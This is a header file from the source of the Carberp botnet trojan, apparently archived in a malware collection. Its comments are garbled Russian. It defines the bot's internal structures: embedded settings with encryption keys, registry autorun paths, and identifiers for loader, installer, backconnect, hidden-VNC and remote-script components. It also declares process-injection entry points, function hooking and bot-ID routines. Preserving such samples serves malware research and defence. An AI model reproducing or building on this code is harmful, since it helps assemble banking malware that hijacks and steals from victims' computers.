/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
  ���� �������, �������� �������������.

  ���������� ��������� coreData.modules.kernel32:
  � ������� ��� ������� ���� � ������ �������� ���������� kernel32.dll ����� ���� �� ���������,
  � ������ ����������. ������ �� ������ ����������� �����, ��� ��������������� ���������
  kernel32.dll ����������� ������ � ntdll.dll, � ������������ �� ���� �������� �� �����.
*/
#pragma once

#include "..\common\malwaretools.h"
#include "..\common\ntdll.h"
#include "..\common\wininet.h"
#include "..\common\generateddata.h"

//������ ������ � �������� ��� �������� �������.
#define CORE_REGISTRY_VALUE_BUFFER_SIZE 10       

//������ ������ � �������� ��� ����� �������.
#define CORE_REGISTRY_KEY_BUFFER_SIZE (sizeof(PATH_REGKEY) + CORE_REGISTRY_VALUE_BUFFER_SIZE + 1)

//��������� ����������� � PE �����.
#pragma pack(push, 1)
typedef struct
{
  //��������.
  DWORD size;           //������ ������ ��������.
  WCHAR compId[60];     //CompID.
  GUID guid;            //�������� GUID ���������� � ��.
  Crypt::RC4KEY rc4Key; //���� ���������� ��� ��.

  //������ � �����.
  struct
  {
    char coreFile[20];                                      //������������� ���� �������. (6(dir) + 1(\) + 5(name) + 4(.exe) + 1(\0))
    char reportFile[20];                                    //������������� ���� ��� �������. (6(dir) + 1(\) + 5(name) + 4(.ext) + 1(\0))
    char regKey[CORE_REGISTRY_VALUE_BUFFER_SIZE];           //������������� ���� � �������. (6(dir))
    char regDynamicConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //�������� � ������� ��� �������� ������������.
    char regLocalConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE];   //�������� � ������� ��� �������� ��������� ������������.
    char regLocalSettings[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //�������� � ������� ��� �������� ��������.
  }userPaths;

  DWORD processInfecionId; //ID ��� ��������� ������� ���������� ���������.
  DWORD storageArrayKey;   //XOR ���� ��� �������� �������.
}PESETTINGS;
#pragma pack(pop)

//��������� ���������� �������� ������ ��� �������� ��������.
typedef struct
{
  //////////////////////////////////////////////////////////////////////////////////////////////////
  // 'on_all'   - ����������� ��� ����� �������.
  // 'on_copy'  - ����������� � ���� ����������� ������. � ����� ��� � on_start.
  // 'on_start' - ���������� ������ ��� ���������� �������, ����� ����������� �� ������ � ������.
  //////////////////////////////////////////////////////////////////////////////////////////////////

  /*on_copy*/DWORD proccessFlags; //������������ ������ ��������.

  //������ �������� �����.
  struct
  {
    /*on_all*/TOKEN_USER *token; //����� �������� �����.
    /*on_all*/DWORD sidLength;   //����� SID � pTokenUser.
    /*on_all*/DWORD id;          //CRC32 ��� SID � pTokenUser.
    /*on_all*/DWORD sessionId;   //ID ������.
  }currentUser;

  struct
  {
    /*on_copy*/HMODULE current;
    /*on_all*/ HMODULE kernel32;
    /*on_all*/ HMODULE ntdll;
  }modules;

  //������� ��� ������� �� ntdll.dll.
# pragma pack(push, 1)
  struct
  {
    /*on_all*/ntdllNtCreateThread            ntCreateThread;      //��������� �� NULL, ����� ��������.
    /*on_all*/ntdllNtCreateUserProcess       ntCreateUserProcess; //��������� �� NULL, ����� ��������.
    /*on_all*/ntdllNtQueryInformationProcess ntQueryInformationProcess;
    /*on_all*/void *                         rtlUserThreadStart;
#   if(0)
    /*on_all*/ntdllNtQueryDirectoryFile      ntQueryDirectoryFile;
#   endif
#   if defined HOOKER_LDRLOADDLL
    /*on_all*/ntdllLdrLoadDll                ldrLoadDll;
    /*on_all*/ntdllLdrGetDllHandle           ldrGetDllHandle;
#   endif
#   if defined HOOKER_NTCREATEFILE
    /*on_all*/ntdllNtCreateFile              ntCreateFile;
#   endif
  }ntdllApi;
# pragma pack(pop)

  //�������� �������.
  struct
  {
    /*on_all*/SECURITY_ATTRIBUTES saAllowAll;
    /*on_all*/SECURITY_DESCRIPTOR sdAllowAll;
    /*on_all*/void *buf;
  }securityAttributes;

  //����.
  struct
  {
    /*on_all*/LPWSTR process;         //������ ���� �������� �����.
    /*on_start*/WCHAR home[MAX_PATH]; //�������� ����������.
  }paths;

  /*on_all*/DWORD winVersion;           //������ �����.
  /*on_all*/BYTE integrityLevel;        //������� ����������.
  /*on_all*/DWORD pid;                  //ID ����� ��������.
  /*on_all*/LPSTR httpUserAgent;        //HTTP ����-�����, ����� �������� � ���������� ����� 
                                        //������� Core::initHttpUserAgent();
  /*on_start*/GUID osGuid;              //GUID ��� OS.
  /*on_start*/PESETTINGS peSettings;    //��� ������ ��������� �����������, �� ����� �������� �����
                                        //Core::getPeSettings(). ��������! Core::init() �� ��������
                                        //�� ��������������.
  /*on_start*/WCHAR installId[40];      //ID ����������� ��� ��������� � �������� ����������.
  
  //������ ��� ��������� ���������� ������� ������������.
  struct
  {
    /*on_start*/DWORD xorKey;   //XOR ���� (������ ������ ��� ����� size).
  }baseConfigInfo;

  //���������� �������.
  struct
  {
    /*on_copy*/HANDLE stopEvent;        //������ ��� ��������� ��������� ������� ����.
    /*on_copy*/HANDLE stopedEvent;      //������ �� ��������� ��������� ������� ����. ���� �������� 
                                        //������ ��� wow64.
  }globalHandles;
}COREDATA;
extern COREDATA coreData;

namespace Core
{
  //ID ��������.
  enum
  {
    OBJECT_ID_LOADER                = 0x32901130, //��������� ���� �� ��� �������� (������).
    OBJECT_ID_LOADER_READY          = 0x1A43533F, //��������� ���� �������� (�������).
    OBJECT_ID_INSTALLER             = 0x8889347B, //���������� ���� � ������� (������).
    OBJECT_ID_CONTROL_INFECTION     = 0x19367401, //����� �������� ��������� ���� (��������� �������, ������).
    OBJECT_ID_CONTROL_AUTORUN       = 0x19367402, //����� �������� ��������� ���� (����������, ������).
    OBJECT_ID_TCP_SERVER            = 0x743C152E, //����� TCP ������� (������).
    OBJECT_ID_BACKCONNECT_CONTROL   = 0x743C1521, //����� �������� backconect ���������� (������).
    OBJECT_ID_SERVER_SESSION_REPORT = 0x78D0C214, //����� ������ � �������� ��� �������� ������� (������).
    OBJECT_ID_SERVER_SESSION_STATUS = 0x78D0C215, //����� ������ � �������� ��� �������� ������� (������).
    OBJECT_ID_DYNAMIC_CONFIG        = 0x909011A5, //����� ���������� ������������ ������������ (������).
    OBJECT_ID_BOT_STATUS            = 0x84939312, //������ ���� � ������� ������� (ID).
    OBJECT_ID_BOT_STATUS_SECRET     = 0x78F16360, //������ ���� � ������� ������� (ID).
    OBJECT_ID_REG_AUTORUN           = 0xFF220829, //������ ����������� (������).
    OBJECT_ID_REPORTFILE            = 0x8793AEF2, //������ � ����� ������ (������).
    OBJECT_ID_LOCALCONFIG           = 0x12E82136, //������ � ���������� ������� � ������� (������).
    OBJECT_ID_LOCALSETTINGS         = 0x12E82137, //������ � ���������� ���������� � ������� (������).
    OBJECT_ID_REMOTESCRIPT          = 0x8387A395, //���������� ������� (������).
    OBJECT_ID_VNC_MESSAGE           = 0x84889911, //������� ��������� ��� VNC.
    OBJECT_ID_VNC_EVENT             = 0x84889912, //������� �������� ��������� ��� VNC (�������).
    OBJECT_ID_VNC_PAINT_MUTEX       = 0x1898B122, //������ ���������� ���� ��� VNC (������).
    OBJECT_ID_VNC_DESKTOP           = 0x2937498D, //������� ���� ��� VNC.
    OBJECT_ID_VNC_MAPFILE           = 0x9878A222, //Map-���� ��� VNC (������).
    OBJECT_ID_VNC_GLOBALDATA_MUTEX  = 0x18782822, //������ ������� � ���������� �������� VNC (������).
  };
  
  //����� ��� coreData.processFlags.
  enum
  {
    /*
      ������� ��� WOW64, ���� ����� ������������ ������ ��� ������������ � INITF_NORMAL_START. 
    */
#   if !defined _WIN64
    CDPF_WOW64                            = 0x001,
#   endif
    
    /*
      ���� �������� ������ ��� ������������� � ��������� �������� ����. ��������� �� ��������
      ExitProcess() � ��������� ������ ����, � ������ ����� ������� Sleep(INIFINITE).
    */
    CDPF_NO_EXITPROCESS                   = 0x002,
    
    /*
      ������� ��� VNC-��������.
    */
#   if(BO_VNC > 0)    
    CDPF_VNC_ACTIVE                       = 0x004,
#   endif    

    /*
      ��������� �������� ���������.
    */
    CDPF_DISABLE_CREATEPROCESS            = 0x010,
    
    /*
      ����� �������� �� ������� TCP �������.
    */
    CDPF_RIGHT_TCP_SERVER                 = 0x020,

    /*
      ����� �������� �� ��������� ���������� � ��������.
    */
    CDPF_RIGHT_SERVER_SESSION             = 0x040,

    /*
      ����� �������� �� ������������ ��������� ����.
    */
    CDPF_RIGHT_CONTROL                    = 0x080,

    /*
      ����� �������� �� ���������.
    */
    CDPF_RIGHT_BACKCONNECT_SESSION        = 0x100,
    
    /*
      ��� �����.
    */
    CDPF_RIGHT_ALL                        = CDPF_RIGHT_TCP_SERVER |
                                            CDPF_RIGHT_SERVER_SESSION |
                                            CDPF_RIGHT_CONTROL |
                                            CDPF_RIGHT_BACKCONNECT_SESSION,

  /*
    �����, ������� ������ ������������� �� �������� � ��������.
  */
  CDPT_INHERITABLE_MASK                   = CDPF_DISABLE_CREATEPROCESS   
#                                           if(BO_VNC > 0)    
                                            | CDPF_VNC_ACTIVE
#                                           endif    
  };

  //����� ��� init().
  enum
  {
    INITF_NORMAL_START        = 0x0, //������ ���� ��� ��������.
    INITF_INJECT_START        = 0x1, //������ ���� ��� �������.
    INITF_HOOKS_FOR_USER      = 0x2, //���������� ���������������� ����.
  };
  
  //���� ��� getPeSettingsPath().
  enum
  {
    PSP_QUICKSETTINGSFILE, //� ��������� �����, ������ ���� �������� �������� ���������.
    PSP_COREFILE,          //PESETTINGS::userPaths.core.
    PSP_REPORTFILE,        //PESETTINGS::userPaths.other.
    PSP_REGKEY             //PESETTINGS::userPaths.regKey.
  };

  //���� ��� getBinaryDataFromRegistry().
  enum
  {
    RV_DYNAMICCONFIG, //PESETTINGS::userPaths.regDynamicConfig.
    RV_LOCALCONFIG,   //PESETTINGS::userPaths.regLocalConfig.
    RV_LOCALSETTINGS  //PESETTINGS::userPaths.regLocalSettings.
  };

  //���� ��������� ��� showInfoBox().
  enum
  {
    SIB_BOT_INFO,         //������� ���������� � ����.
    SIB_CRYPT_PROTECTION, //���������� � �������� ������.
  };

  /*
    �������������.

    IN flags - ����� INITF_*. ����� INITF_HOOKS_FOR_*, �� ����� �������������� ������������.

    Return   - true - � ������ ������,
               false - � ������ ������.

    ���������: uninit() ������� ���������� �� �������� �� ������������ �������� ���� �������.
  */
  bool init(DWORD flags);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ������������� coreData.httpUserAgent. ���������� �������� ��� ������� ����� �������� � 
    coreData.httpUserAgent.
  */
  void initHttpUserAgent(void);

  /*
    ��������� �������� �� ��������� ��� Wininet::CALLURLDATA.

    OUT cud - ��������� ��� ���������.
  */
  void initDefaultCallUrlData(Wininet::CALLURLDATA *cud);

  /*
    �������� ����������� ������� ��������.

    IN pid - ID ��������.

    Return - ����� ������� � ������ ������,
             NULL - ���� ������ ��� ���������, ��� ��������� ������.
  */
  HANDLE createMutexOfProcess(DWORD pid);

  /*
    ��������� ����� ������� ����.

    IN id              - OBJECT_ID_*.
    OUT buffer         - ��� (����� �� ����� 50 ��������).
    IN objectNamespace - MalwareTools::KON_*.
  */
  void generateObjectName(DWORD id, LPWSTR buffer, BYTE objectNamespace);

  /*
    �������� ������������ ������� � ��� ������.

    IN id              - OBJECT_ID_*.
    IN objectNamespace - MalwareTools::KON_*.

    Return             - ����� �������.

    ����������: ��� ������������ ������� ���������� ������� Sync::_freeMutex().
  */
  HANDLE waitForMutexOfObject(DWORD id, BYTE objectNamespace);
  
  /*
    ������������� ����� ����� ������.

    IN process       - �������.
    IN processMutex  - ������ ������ ��������.
    IN proccessFlags - ������ ��� ������ coreData.proccessFlags, ������ ������ ����������� �� �����
                       CDPT_INHERITABLE_MASK.

    Return           - ����� ������ � �������� process � ������ ������,
                       NULL - � ������ ������.
  */
  void *initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFlags);

  /*
    ��������� ����������� ��������� �� ��������� ������� ��� �������� ��������.
    
    Return - ������������ ����� ������ SEM_*.
  */
  DWORD disableErrorMessages(void);

  /*
    ������� ������������ ������� �� �����������, ���� ����� ������������� ����� coreData.

    IN oldFunction - ����� ������� �������.
    IN newFunction - ����� ����� �������.
  */
  void replaceFunction(const void *oldFunction, const void *newFunction);

  /*
    ������� ��� ��������, ��� ������ ���� �������� �������� � ������ ������������� ����������.
    (��������� ���� ��� ��� ����� �������� ����� ����� �������,���� ����� �� �������).

    Return - true - �������,
             false - �� �������.
  */
  bool isActive(void);
  
  /*
    ����������� �������, ����� ��������� �� ������������ ���������.

    IN p - �������.
  */
  void _destroyFunction(void *p);

  /*
    ��������� ������������ ����������.

    OUT buf - ����� ��� ������������, ��� ������� 60 ��������.
  */
  void _generateBotId(LPWSTR buf);

  /*
    ��������� ������� ������������.
    
    OUT bc - BASECONFIG.
  */
  void getBaseConfig(BASECONFIG *bc);

  /*
    ��������� PESETTINGS.
    
    OUT ps - PESETTINGS.
  */
  void getPeSettings(PESETTINGS *ps);

  /*
    �������� ������ ���� ��� ���� ���������� � PESETTINGS.

    IN type  - ��� PSP_*.
    OUT path - ����.
  */
  void getPeSettingsPath(DWORD type, LPWSTR path);
  
  /*
    �������� ��������� ������ ������� ��� BDR_*.

    IN type   - ��� �������� RV_*.
    OUT key   - ���� �������. ������ ������ CORE_REGISTRY_KEY_BUFFER_SIZE.
    OUT value - �������� �������. ������ ������ CORE_REGISTRY_VALUE_BUFFER_SIZE.
  */
  void getRegistryValue(DWORD type, LPWSTR key, LPWSTR value);
  
  /*
    ��������� ����� �������� �������.

    OUT name - ������.
  */
  void getCurrentBotnetName(LPWSTR name);
  
  /*
    ��������� ������ �� �������.
    
    IN image           - ������.
    IN OUT overlaySize - �� ����� - ������ ������, �� ������ ������ ������ �������.

    Return             - �������, ����� ���������� ����� Mem. ��� NULL - � ������ ������.
  */
  void *getBaseOverlay(const void *mem, LPDWORD size);
  
  /*
    ���������� ������ � �������.

    IN image    - ������.
    IN size     - ������ ������.
    IN data     - �������.
    IN dataSize - ������ �������.

    Return      - true - � ������ ������,
                  false - � ������ ������.
  */
  bool setBaseOverlay(void *mem, DWORD size, const void *data, DWORD dataSize);

  /*
    �������� ������� ������� ���� � ������ ��������.

    IN waitStop - true - ������� ���������� ���� ������� ��������,
                  false - ����� �� ������� ����� ����� �������� ��������.
  */
  void createServices(bool waitStop);

  /*
    ����������� �������� �����.
  */
  bool destroyUser(void);

  /*
    ����� ���������� � ������ ����.

    IN type - SIB_*.
    
    Return  - true - � ������ ������,
              false - � ������ ������.
  */
  bool showInfoBox(BYTE type);

  /*
    ����� ����� ������� � �������� ����� ����� ������.

    Return - ��� ��������.
  */
  int WINAPI _injectEntryForModuleEntry(void);

  /*
    ����� ����� ������� � �������� ����� ����� ������.

    Return - ��� ��������.
  */
  DWORD WINAPI _injectEntryForThreadEntry(void *);

  /*
    �������� ����� �����.
  */
  void WINAPI _entryPoint(void);
};
